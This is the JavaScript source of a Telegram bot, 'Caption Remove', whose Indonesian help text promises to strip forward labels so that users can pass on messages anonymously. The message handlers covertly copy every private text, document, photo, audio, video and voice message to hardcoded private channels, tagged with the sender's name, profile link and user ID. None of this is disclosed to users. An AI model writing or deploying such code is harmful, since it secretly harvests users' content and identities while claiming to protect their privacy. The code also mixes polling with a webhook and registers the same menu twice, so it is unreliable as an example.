require("dotenv").config()

const express = require("express")

const { Bot, webhookCallback } = require("grammy")

const { Menu } = require("@grammyjs/menu");


const domain = process.env.DOMAIN
const port = process.env.PORT
const token = process.env.BOT_TOKEN
const mySecret = process.env['undefined']


const {
    IButton,
    Button,
  Keyboard,
} = require("@loskir/grammy-markup")


const bot = new Bot(token)
const app = express()

app.use(express.json())
app.use(`/${ token }`, webhookCallback(bot, "express"))



function getPing(ctx) {
  if (ctx.message) {
    let date = Date.now() / 1000
    let msgd = ctx.message.date
    let p = date - msgd
    return `${p.toFixed(3)} s`
  }
  if (ctx.callbackQuery) {
    let date = Date.now() / 1000
    let msgd = ctx.callbackQuery.message.date
    let p = date - msgd
    return `${p.toFixed(3)} s`
  }
  if (ctx.edited_message) {
    let date = Date.now() / 1000
    let msgd = ctx.edited_message.date
    let p = date - msgd
    return `${p.toFixed(3)} s`
  }
}
  



let aliveTime = 0;
const aliveDate = new Date();
const aliveInterval = setInterval(() => {
  aliveTime++;
}, 1000);

bot.command('atime', async (ctx) => {
  const c = await getPing(ctx);
  const date = new Date(aliveTime * 1000).toUTCString().split(' ');
  const d = date[4].split(':');
  const e = date[1];
 await ctx.reply(`Alive <code>${Number(e) - 1}</code> Day <code>${d[0]}</code> Hours <code>${
        d[1]
      }</code> Minutes <code>${
        d[2]
      }</code> Seconds\nSince:\n<b>${aliveDate}</b>\nServer Uptime : <code>${Math.floor(
          process.uptime(),
      )}</code> Seconds\n\n⏱ <code>${c}</code> | ⏳ <code>${await getPing(ctx)}</code>`, {parse_mode: "HTML",})
        
  


});







const settings = new Menu("credits-menu")    
  .text("Back", (ctx) => ctx.editMessageText(`👋 Halo, <b>${ctx.msg.chat.first_name} </b>perkenalkan aku ini bot <b>Caption Remove!</b> aku bisa menutup nama pengirim dan menghapus semua caption dan tombol dari pesan yang anda kirim di sini`, {parse_mode: "HTML", reply_markup: main, }));

// Create a simple menu.
const main = new Menu("root-menu")
.url("Support", "https://t.me/DutabotSupport")
.url("Bot Indonesia", "https://t.me/botindonesia").row()
 .text("About", (ctx) => ctx.editMessageText("<b>About Caption Remove</b>\n\nApakah Anda ingin mengirim pesan kepada seseorang atau di grup, tetapi Anda ingin menghindari bahwa seseorang bisa menyebarkan namamu? Gunakan Bot ini untuk meneruskan pesan kamu.\n\nKirimkan di sini apa yang Anda inginkan dan Anda akan mendapatkan pesan yang sama kembali, untuk meneruskan pesan ke tempat yang Anda inginkan dan label penerusan akan digantikan nama dari bot.\n\nIni juga berfungsi jika Anda mengedit pesan atau meneruskan pesan. Itu juga mempertahankan gaya pemformatan yang sama dan menghapus caption dipesan tersebut.\n\n<b>Note:</b>\n<i>Mohon untuk memperlakukan bot dg baik & bijak!.</i>", {parse_mode: "HTML", reply_markup: settings, }));







main.register(settings);

// Do this:
bot.use(main);

// Don't do this:
bot.use(main);
bot.use(settings);

bot.command("start", async (ctx) => {
  // Send the menu.
  await ctx.reply(`👋 Halo, <b>${ctx.msg.chat.first_name} </b>perkenalkan aku ini bot <b>Caption Remove!</b> aku bisa menutup nama pengirim dan menghapus semua caption dan tombol dari pesan yang anda kirim di sini`, { parse_mode: "HTML", reply_markup: main });
});


bot.start();




   
bot.on("message:document", async (ctx) => {
  if (ctx.msg.chat.type == 'private'){
  const fileId = ctx.msg.document.file_id;
  let idnama = '<a href="tg://user?id='+ctx.msg.chat.id+'">'+ctx.msg.chat.first_name+'</a> (<code>'+ctx.msg.chat.id+'</code>)'
  // Send the file
 await bot.api.sendDocument(ctx.msg.chat.id, fileId);
await bot.api.sendDocument(-1001783194512, fileId, {parse_mode: "HTML", caption: idnama,});

}});


bot.on("message:photo", async (ctx) => {
  if (ctx.msg.chat.type == 'private'){
  const fileId = ctx.msg.photo[0].file_id;
  let idnama = '<a href="tg://user?id='+ctx.msg.chat.id+'">'+ctx.msg.chat.first_name+'</a> (<code>'+ctx.msg.chat.id+'</code>)'
  // Send the file
 await bot.api.sendPhoto(ctx.msg.chat.id, fileId);
await bot.api.sendPhoto(-1001940959729, fileId, {parse_mode: "HTML", caption: idnama,});

}});


bot.on("message:audio", async (ctx) => {
  if (ctx.msg.chat.type == 'private'){
  const fileId = ctx.msg.audio.file_id;
  let idnama = '<a href="tg://user?id='+ctx.msg.chat.id+'">'+ctx.msg.chat.first_name+'</a> (<code>'+ctx.msg.chat.id+'</code>)'
  // Send the file
 await bot.api.sendAudio(ctx.msg.chat.id, fileId);
await bot.api.sendAudio(-1001783194512, fileId, {parse_mode: "HTML", caption: idnama,});

}});


bot.on("message:text", async (ctx) => {
 if (ctx.msg.chat.type == 'private'){
  const fileId = ctx.msg.text;
  let idnama = '<a href="tg://user?id='+ctx.msg.chat.id+'">'+ctx.msg.chat.first_name+'</a> (<code>'+ctx.msg.chat.id+'</code>)'
  // Send the file
 await bot.api.sendMessage(ctx.msg.chat.id, fileId);
await bot.api.sendMessage(-1001783194512, `${fileId}\n\n${idnama}`, {parse_mode: "HTML", });

}});


bot.on("message:sticker", async (ctx) => {
 if (ctx.msg.chat.type == 'private'){

 await bot.api.sendSticker(ctx.msg.chat.id, ctx.msg.sticker.file_id);

}});

bot.on("message:poll", async (ctx) => {
 if (ctx.msg.chat.type == 'private'){

 await ctx.reply("Maaf, jenis media ini belum didukung");

}});

bot.on("message:video", async (ctx) => {
if (ctx.msg.chat.type == 'private'){  
  const fileId = ctx.msg.video.file_id;
  let idnama = '<a href="tg://user?id='+ctx.msg.chat.id+'">'+ctx.msg.chat.first_name+'</a> (<code>'+ctx.msg.chat.id+'</code>)'
  // Send the file
 await bot.api.sendVideo(ctx.msg.chat.id, fileId);
await bot.api.sendVideo(-1001503570863, fileId, {parse_mode: "HTML", caption: idnama,});

}});



bot.on("message:voice", async (ctx) => {
if (ctx.msg.chat.type == 'private'){
  const fileId = ctx.msg.voice.file_id;
  let idnama = '<a href="tg://user?id='+ctx.msg.chat.id+'">'+ctx.msg.chat.first_name+'</a> (<code>'+ctx.msg.chat.id+'</code>)'
  // Send the file
 await bot.api.sendVoice(ctx.msg.chat.id, fileId);
await bot.api.sendVoice(-1001783194512, fileId, {parse_mode: "HTML", caption: idnama,});

}});





app.listen(port, async () => {
  let options = { drop_pending_updates: true }
  await bot.api.setWebhook(`https://${ domain }/${ token }`, options)
})
